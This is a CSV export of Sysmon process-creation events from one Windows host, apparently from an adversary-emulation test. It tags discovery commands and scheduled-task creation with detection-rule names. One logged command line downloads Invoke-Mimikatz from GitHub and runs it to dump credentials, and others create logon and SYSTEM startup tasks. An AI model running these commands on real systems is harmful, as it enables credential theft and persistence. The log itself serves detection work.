timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data
2026-08-16T14:44:15.748969+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,4211,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 10476
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CCBF-6A81-0F0C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:44:15.743
"
2026-08-16T14:44:15.808318+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,4212,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 828
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-CCBF-6A81-100C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 14:44:15.785
"
2026-08-16T15:13:26.729903+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,5675,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 7704
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D396-6A81-9B0C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:13:26.721
"
2026-08-16T15:13:26.807182+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,5676,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8252
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D396-6A81-9C0C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:13:26.803
"
2026-08-16T15:35:08.700374+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6592,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9624
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D8AC-6A81-F50C-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:08.696
"
2026-08-16T15:35:08.753767+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6593,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6756
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-D8AC-6A81-F60C-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:08.746
"
2026-08-16T15:35:14.934715+00:00,HackTool - Mimikatz Execution;Malicious PowerShell Commandlets - ProcessCreation;PowerShell Download and Execution Cradles;Suspicious PowerShell Download and Execute Pattern;Suspicious PowerShell Invocations - Specific - ProcessCreation;Suspicious Program Names,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6594,DESKTOP-JC89B03,"Image: C:\Windows\System32\cmd.exe
RuleName: '-'
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=CB6CD09F6A25744A8FA6E4B3E4D260C5,SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9084
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-D8AD-6A81-F70C-000000000200
CommandLine: '""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1''); Invoke-Mimikatz -DumpCreds""'
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 15:35:09.929
"
2026-08-16T16:13:38.809847+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6634,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 3944
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1B2-6A81-230D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:13:38.804
"
2026-08-16T16:13:38.842060+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6635,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 5172
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1B2-6A81-240D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:13:38.838
"
2026-08-16T16:14:02.999357+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6636,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6576
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1CA-6A81-250D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:14:02.995
"
2026-08-16T16:14:03.024569+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6637,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 5328
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E1CB-6A81-260D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:14:03.022
"
2026-08-16T16:21:53.128678+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6647,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 10380
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E3A1-6A81-2D0D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:21:53.120
"
2026-08-16T16:21:53.164258+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6648,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 8980
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E3A1-6A81-2E0D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:21:53.160
"
2026-08-16T16:21:54.824220+00:00,Scheduled Task Creation Via Schtasks.EXE;Suspicious Schtasks Schedule Types,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6650,DESKTOP-JC89B03,"Image: C:\Windows\System32\schtasks.exe
RuleName: '-'
Description: Task Scheduler Configuration Tool
OriginalFileName: schtasks.exe
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 10416
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
ParentProcessGuid: 50A489D6-E3A1-6A81-2F0D-000000000200
ProcessId: 10872
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-E3A2-6A81-310D-000000000200
CommandLine: 'schtasks  /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" '
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2026-08-16 16:21:54.800
"
2026-08-16T16:21:54.932169+00:00,Scheduled Task Creation Via Schtasks.EXE;Schtasks Creation Or Modification With SYSTEM Privileges;Suspicious Command Patterns In Scheduled Task Creation;Suspicious Schtasks Schedule Type With High Privileges,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6652,DESKTOP-JC89B03,"Image: C:\Windows\System32\schtasks.exe
RuleName: '-'
Description: Task Scheduler Configuration Tool
OriginalFileName: schtasks.exe
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 10416
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
ParentProcessGuid: 50A489D6-E3A1-6A81-2F0D-000000000200
ProcessId: 6120
CurrentDirectory: C:\Users\soc\AppData\Local\Temp\
ProcessGuid: 50A489D6-E3A2-6A81-320D-000000000200
CommandLine: schtasks  /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2026-08-16 16:21:54.909
"
2026-08-16T16:25:53.507739+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6658,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 4644
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E491-6A81-3B0D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:25:53.503
"
2026-08-16T16:25:53.530347+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6659,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 6244
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E491-6A81-3C0D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:25:53.527
"
2026-08-16T16:26:14.450617+00:00,Suspicious Execution of Hostname,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6663,DESKTOP-JC89B03,"Image: C:\Windows\System32\HOSTNAME.EXE
RuleName: '-'
Description: Hostname APP
OriginalFileName: hostname.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=33AFAA43B84BDEAB12E02F9DBD2B2EE0,SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335,IMPHASH=5CD891320C666621E9783444DB8CBA78
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 9524
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E4A6-6A81-410D-000000000200
CommandLine: '""C:\Windows\system32\HOSTNAME.EXE""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:26:14.446
"
2026-08-16T16:26:14.477126+00:00,Local Accounts Discovery,C:\logs\sysmon_20260909_122937.evtx,1,Microsoft-Windows-Sysmon,1,6664,DESKTOP-JC89B03,"Image: C:\Windows\System32\whoami.exe
RuleName: '-'
Description: whoami - displays logged on user information
OriginalFileName: whoami.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 9852
ParentUser: DESKTOP-JC89B03\soc
LogonGuid: 50A489D6-8293-6A4A-4D93-060000000000
Hashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: 50A489D6-C98D-6A81-E60B-000000000200
ProcessId: 2456
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 50A489D6-E4A6-6A81-420D-000000000200
CommandLine: '""C:\Windows\system32\whoami.exe""'
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
User: DESKTOP-JC89B03\soc
LogonId: '0x6934d'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2026-08-16 16:26:14.472
"
